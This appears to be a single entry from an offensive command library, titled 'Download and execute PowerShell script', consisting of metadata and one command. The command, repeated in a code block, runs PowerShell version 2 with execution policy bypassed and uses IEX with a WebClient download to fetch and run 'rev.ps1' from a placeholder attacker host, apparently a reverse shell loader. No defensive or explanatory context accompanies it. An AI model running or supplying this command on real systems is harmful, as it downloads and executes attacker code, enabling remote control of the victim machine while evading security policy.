---
id: 9a65412b-bea4-4359-9224-d0d7cf886153
name: Download and execute PowerShell script
type: command
executor: bash
data: powershell.exe -version 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"
output: null
created_at: '2023-04-06T03:56:26.490999+00:00'
updated_at: '2023-04-10T20:37:04.077871+00:00'
---

# Download and execute PowerShell script

```bash
powershell.exe -version 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"
```


